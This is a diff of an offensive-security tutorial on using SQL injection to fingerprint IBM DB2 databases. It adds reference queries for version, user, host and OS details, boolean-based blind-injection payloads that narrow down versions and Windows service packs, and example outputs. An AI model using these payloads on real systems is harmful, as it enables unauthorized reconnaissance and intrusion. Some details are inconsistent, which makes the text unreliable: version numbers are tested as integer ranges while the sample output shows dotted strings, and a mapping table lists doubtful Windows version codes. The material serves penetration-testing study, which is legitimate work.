@@ -1,9 +1,9 @@
 ---
-title: IBM Db2 Version and Environment Detection Techniques
-description: Discover techniques for detecting IBM Db2 version and environment info
+title: IBM DB2 Version and Environment Detection Techniques
+description: Discover techniques for detecting IBM DB2 version and environment info
   using SQL injections.
 keywords:
-- IBM Db2
+- IBM DB2
 - version detection
 - environment information
 - SQL injection
@@ -16,79 +16,208 @@ keywords:
 
 ## Context
 
-In this article, we will explore techniques for extracting version and environment information from IBM Db2 databases using SQL injection methodologies. The ability to enumerate such details is crucial for understanding the target environment, which aids in further exploitation strategies. This content assumes you have knowledge of basic database enumeration and experience in executing SQL queries.
+In this article, we will explore techniques for extracting version and environment information from IBM DB2 databases using SQL injection methodologies. The ability to enumerate such details is crucial for understanding the target environment, which aids in further exploitation strategies. This content assumes you have knowledge of basic database enumeration and experience in executing SQL queries.
 
 ## Theory
 
-### Db2 Version Identification Methods
+### DB2 Version Identification Methods
 
-Understanding the version of an IBM Db2 database is essential for tailoring subsequent attack strategies. Various methods can be employed to detect the version, primarily through leveraging system catalog tables and built-in functions in Db2. 
+Understanding the version of an IBM DB2 database is essential for tailoring subsequent attack strategies. Various methods can be employed to detect the version, primarily through leveraging system catalog tables and built-in functions in DB2. 
 
-### Understanding Db2 Catalog Tables
+> **Insight:** In scenarios where direct output is not available (e.g., blind SQL injection), you can use boolean-based queries to infer version information. For example, by checking if the version number falls within a certain range, you can narrow down the DB2 version step by step.
 
-Db2 catalog tables store metadata about the database, including schema, type of objects, and system configuration. The `sysibm.sysversions` table, in particular, holds information about version details. SQL injection can exploit such catalog tables to extract sensitive data, providing unauthorized insight into the database's structure and configuration.
+### Understanding DB2 Catalog Tables
 
-### Environment Variable Extraction in Db2
+DB2 catalog tables store metadata about the database, including schema, type of objects, and system configuration. The `sysibm.sysversions` table, in particular, holds information about version details. SQL injection can exploit such catalog tables to extract sensitive data, providing unauthorized insight into the database's structure and configuration.
 
-Extracting environment variables from a Db2 database can reveal critical insights about the running instance's operational settings. Using SQL functions like `sysproc.env_get_inst_info()`, attackers can retrieve environment details that divulge setup configurations and provide a deeper understanding of the instance.
+> **Insight:** You can use boolean expressions like `(SELECT COUNT(*) FROM sysibm.sysversions WHERE versionnumber BETWEEN 11000000 AND 11999999)>0` to determine if the version is in the 11.x range, then further refine by adjusting the range for minor versions. This incremental approach is especially useful for blind SQLi.
 
-### Db2 System Information Retrieval
+### Environment Variable Extraction in DB2
 
-System-level information disclosure from Db2 is another crucial step in post-exploitation. Functions like `sysibmadm.env_sys_info` are often used in SQL injection attacks to access underlying system attributes and configuration details, offering a comprehensive view of the target's operational posture.
+Extracting environment variables from a DB2 database can reveal critical insights about the running instance's operational settings. Using SQL functions like `sysproc.env_get_inst_info()`, attackers can retrieve environment details that divulge setup configurations and provide a deeper understanding of the instance.
+
+### DB2 System Information Retrieval
+
+System-level information disclosure from DB2 is another crucial step in post-exploitation. Functions like `sysibmadm.env_sys_info` are often used in SQL injection attacks to access underlying system attributes and configuration details, offering a comprehensive view of the target's operational posture.
+
+> **Insight:** The operating system can be inferred by checking the `OS_NAME` field for patterns (e.g., `%WIN%` for Windows). Further details like service pack or build level can be determined by querying `OS_VERSION` and `OS_RELEASE`. Boolean-based checks on these fields are valuable for blind SQLi.
 
 ## Practice
 
-### Db2 Version Detection via sysibm.sysversions
+### Quick Reference Table
 
-To determine the version of Db2, querying the `sysibm.sysversions` table is an effective approach.
+| Goal             | Example Query                                                                                   |
+|------------------|-----------------------------------------------------------------------------------------------|
+| DBMS version     | `SELECT versionnumber, version_timestamp FROM sysibm.sysversions;`                             |
+| DBMS version     | `SELECT service_level FROM TABLE(sysproc.env_get_inst_info()) AS instanceinfo;`                |
+| DBMS version     | `SELECT getvariable('sysibm.version') FROM sysibm.sysdummy1;`                                 |
+| DBMS version     | `SELECT prod_release, installed_prod_fullname FROM TABLE(sysproc.env_get_prod_info()) AS productinfo;` |
+| DBMS version     | `SELECT service_level, bld_level FROM sysibmadm.env_inst_info;`                                |
+| Current user     | `SELECT user FROM sysibm.sysdummy1;`                                                          |
+| Current user     | `SELECT session_user FROM sysibm.sysdummy1;`                                                  |
+| Current user     | `SELECT system_user FROM sysibm.sysdummy1;`                                                   |
+| Current database | `SELECT current server FROM sysibm.sysdummy1;`                                                |
+| OS info          | `SELECT os_name, os_version, os_release, host_name FROM sysibmadm.env_sys_info;`              |
 
-```bash
-SELECT * FROM sysibm.sysversions;
+> **Note:** You can select specific columns from catalog tables and functions for more targeted information, rather than using `SELECT *`.
+
+---
+
+### DBMS Version Detection via sysibm.sysversions
+
+To determine the version of DB2, querying the `sysibm.sysversions` table is an effective approach.
+
+```sql
+SELECT versionnumber, version_timestamp FROM sysibm.sysversions;
 ```
+*Outcome*: Returns the DB2 version number and the timestamp of the version.
+*Example Output:*
+| VERSIONNUMBER | VERSION_TIMESTAMP     |
+|---------------|----------------------|
+| 11.5.7.0      | 2023-01-15-12.34.56  |
 
-Executing this command provides sensitive data access to the version description of the database.
+> **Insight:** If you cannot retrieve output directly, you can use boolean-based queries to infer the version. For example, test if a version exists in a range and adjust the range to narrow down the exact version.
 
-### Environment Information via sysproc.env_get_inst_info()
+**Boolean-based version detection examples:**
+- Check if the major version is 11:
+  ```sql
+  (SELECT COUNT(*) FROM sysibm.sysversions WHERE versionnumber BETWEEN 11000000 AND 11999999)>0
+  ```
+- Check if the minor version is 11.5:
+  ```sql
+  (SELECT COUNT(*) FROM sysibm.sysversions WHERE versionnumber BETWEEN 11050000 AND 11059999)>0
+  ```
+*Outcome*: If the result is true, the version matches the tested range. Adjust the range to further refine the version.
 
-Retrieve detailed information about the Db2 instance's environment using the `sysproc.env_get_inst_info()` function.
-
-```bash
-SELECT * FROM TABLE(sysproc.env_get_inst_info()) AS t;
+Retrieve service level from instance info:
+```sql
+SELECT service_level FROM TABLE(sysproc.env_get_inst_info()) AS instanceinfo;
 ```
+*Outcome*: Returns the service level of the DB2 instance.
+*Example Output:*
+| SERVICE_LEVEL |
+|--------------|
+| s210512       |
 
-This command yields environment-specific details such as instance name, node name, and configuration directories.
-
-### Version Retrieval using getvariable('sysibm.version')
-
-The `getvariable` function can be used to directly fetch the Db2 version.
-
-```bash
-VALUES getvariable('sysibm.version');
+Retrieve version using getvariable:
+```sql
+SELECT getvariable('sysibm.version') FROM sysibm.sysdummy1;
 ```
+*Outcome*: Returns the DB2 version string.
+*Example Output:*
+| 1             |
+|---------------|
+| 11.5.7.0      |
 
-This statement executes a command that returns the current Db2 version, leveraging built-in environment variables.
-
-### Product Information via sysproc.env_get_prod_info()
-
-Acquiring product information can be executed using the `sysproc.env_get_prod_info()` function.
-
-```bash
-SELECT * FROM TABLE(sysproc.env_get_prod_info()) AS t;
+Retrieve product release and full name:
+```sql
+SELECT prod_release, installed_prod_fullname FROM TABLE(sysproc.env_get_prod_info()) AS productinfo;
 ```
+*Outcome*: Returns the product release and full product name.
+*Example Output:*
+| PROD_RELEASE | INSTALLED_PROD_FULLNAME      |
+|--------------|-----------------------------|
+| 11.5.7.0     | DB2 Advanced Enterprise     |
 
-Fetching product details is critical for understanding the Db2 setup, including build level and fix pack information, which can influence attack methodologies.
-
-### System Information via sysibmadm.env_sys_info
-
-To comprehensively ascertain system attributes, `sysibmadm.env_sys_info` should be queried.
-
-```bash
-SELECT * FROM sysibmadm.env_sys_info;
+Retrieve service level and build level from environment info:
+```sql
+SELECT service_level, bld_level FROM sysibmadm.env_inst_info;
 ```
+*Outcome*: Returns the service level and build level of the DB2 instance.
+*Example Output:*
+| SERVICE_LEVEL | BLD_LEVEL |
+|---------------|-----------|
+| s210512       | 20230512  |
 
-The resulting insight into system settings provides important operational context that can guide further penetration testing efforts.
+---
+
+### User and Database Information
+
+Retrieve the current user:
+```sql
+SELECT user FROM sysibm.sysdummy1;
+```
+*Outcome*: Returns the current user name.
+*Example Output:*
+| USER     |
+|----------|
+| DB2USER1 |
+
+Retrieve the session user:
+```sql
+SELECT session_user FROM sysibm.sysdummy1;
+```
+*Outcome*: Returns the session user name.
+*Example Output:*
+| SESSION_USER |
+|--------------|
+| DB2USER1     |
+
+Retrieve the system user:
+```sql
+SELECT system_user FROM sysibm.sysdummy1;
+```
+*Outcome*: Returns the operating system user running the DB2 session.
+*Example Output:*
+| SYSTEM_USER |
+|-------------|
+| db2inst1    |
+
+Retrieve the current database/server:
+```sql
+SELECT current server FROM sysibm.sysdummy1;
+```
+*Outcome*: Returns the name of the current database server.
+*Example Output:*
+| CURRENT SERVER |
+|----------------|
+| SAMPLE         |
+
+---
+
+### OS and Environment Information
+
+Retrieve OS and host information:
+```sql
+SELECT os_name, os_version, os_release, host_name FROM sysibmadm.env_sys_info;
+```
+*Outcome*: Returns the operating system name, version, release, and host name.
+*Example Output:*
+| OS_NAME | OS_VERSION | OS_RELEASE | HOST_NAME |
+|---------|------------|------------|-----------|
+| Linux   | 5.10.0     | 112        | db2host   |
+
+> **Insight:** If you cannot retrieve output directly, use boolean-based queries to infer the OS. For example, check if `OS_NAME` contains 'WIN' to determine if the server is running Windows. You can also check for specific OS versions or service packs by querying `OS_VERSION` and `OS_RELEASE` fields with boolean expressions.
+
+**Boolean-based OS and service pack detection examples:**
+- Check if the OS is Windows:
+  ```sql
+  (SELECT LENGTH(OS_NAME) FROM SYSIBMADM.ENV_SYS_INFO WHERE OS_NAME LIKE '%WIN%')>0
+  ```
+- Check if the OS version is 5.2 (e.g., Windows 2003):
+  ```sql
+  (SELECT LENGTH(OS_VERSION) FROM SYSIBMADM.ENV_SYS_INFO WHERE OS_VERSION = '5.2')>0
+  ```
+- Check if the OS release contains a specific service pack:
+  ```sql
+  (SELECT LENGTH(OS_RELEASE) FROM SYSIBMADM.ENV_SYS_INFO WHERE OS_RELEASE LIKE '%Service Pack 2%')>0
+  ```
+*Outcome*: If the result is true, the OS or service pack matches the tested value. Adjust the value to further refine the OS fingerprint.
+
+> **Insight:** Certain `OS_VERSION` and `OS_RELEASE` values can be mapped to specific Windows versions and service packs. Use the following mapping to guide your boolean-based queries:
+>
+> | Windows Version | OS_VERSION | Service Packs (OS_RELEASE) |
+> |-----------------|------------|---------------------------|
+> | 2003            | 5.2        | 2, 1                      |
+> | 2008            | 7.0        | 1                         |
+> | 2000            | 5.0        | 4, 3, 2, 1                |
+> | 7               | 6.1        | 1, 0                      |
+> | XP              | 5.1        | 2, 1                      |
+> | NT              | 4.0        | 6, 5, 4, 3, 2, 1          |
+>
+> For example, if `OS_VERSION` is '5.2' and `OS_RELEASE` contains 'Service Pack 2', the server is likely running Windows 2003 SP2. Use this mapping to incrementally fingerprint the exact Windows version and service pack using boolean-based queries.
 
 ## Tools
 
-- **Db2 Command Line Processor (CLP)**
-- **SQL Injection Tools**
+- **sqlmap**
+- **Burp Suite**
